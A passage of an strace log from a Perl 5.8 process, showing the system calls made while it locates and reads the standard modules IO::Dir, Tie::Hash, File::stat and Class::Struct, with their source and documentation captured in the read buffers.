13033 07:45:20.102295 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
13033 07:45:20.102773 stat64("/etc/perl/Tie/Hash.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102790 stat64("/etc/perl/Tie/Hash.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102804 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102817 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102838 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102853 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102867 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102879 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102892 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102908 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102922 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102934 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102948 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.102960 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
13033 07:45:20.102982 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
13033 07:45:20.102997 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab268) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.103008 _llseek(8, 0, [0], SEEK_CUR) = 0
13033 07:45:20.103027 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
13033 07:45:20.103348 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
13033 07:45:20.103875 read(8, "", 4096) = 0
13033 07:45:20.103892 close(8)          = 0
13033 07:45:20.103923 stat64("/etc/perl/File/stat.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.103938 stat64("/etc/perl/File/stat.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.103952 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.103965 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.103979 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.103992 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.104006 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.104018 stat64("/usr/lib/perl5/File/stat.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.104031 stat64("/usr/share/perl5/File/stat.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.104044 stat64("/usr/share/perl5/File/stat.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.104057 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.104070 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.104084 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.104097 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
13033 07:45:20.104118 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
13033 07:45:20.104133 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab268) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.104145 _llseek(8, 0, [0], SEEK_CUR) = 0
13033 07:45:20.104162 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
13033 07:45:20.104649 stat64("/etc/perl/Class/Struct.pmc", 0xbfcab09c) = -1 ENOENT (No such file or directory)
13033 07:45:20.104667 stat64("/etc/perl/Class/Struct.pm", 0xbfcaafac) = -1 ENOENT (No such file or directory)
13033 07:45:20.104681 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfcab09c) = -1 ENOENT (No such file or directory)
13033 07:45:20.104694 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfcaafac) = -1 ENOENT (No such file or directory)
13033 07:45:20.104708 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfcab09c) = -1 ENOENT (No such file or directory)
13033 07:45:20.104721 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfcaafac) = -1 ENOENT (No such file or directory)
13033 07:45:20.104736 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfcab09c) = -1 ENOENT (No such file or directory)
13033 07:45:20.104747 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfcaafac) = -1 ENOENT (No such file or directory)
13033 07:45:20.104761 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfcab09c) = -1 ENOENT (No such file or directory)
13033 07:45:20.104773 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfcaafac) = -1 ENOENT (No such file or directory)
13033 07:45:20.104787 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfcab09c) = -1 ENOENT (No such file or directory)
13033 07:45:20.104799 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfcaafac) = -1 ENOENT (No such file or directory)
13033 07:45:20.104813 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfcab09c) = -1 ENOENT (No such file or directory)
13033 07:45:20.104826 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
13033 07:45:20.104848 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
13033 07:45:20.104863 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaadb8) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.104875 _llseek(10, 0, [0], SEEK_CUR) = 0
13033 07:45:20.104893 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
13033 07:45:20.105298 brk(0x82de000)    = 0x82de000
13033 07:45:20.105652 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print 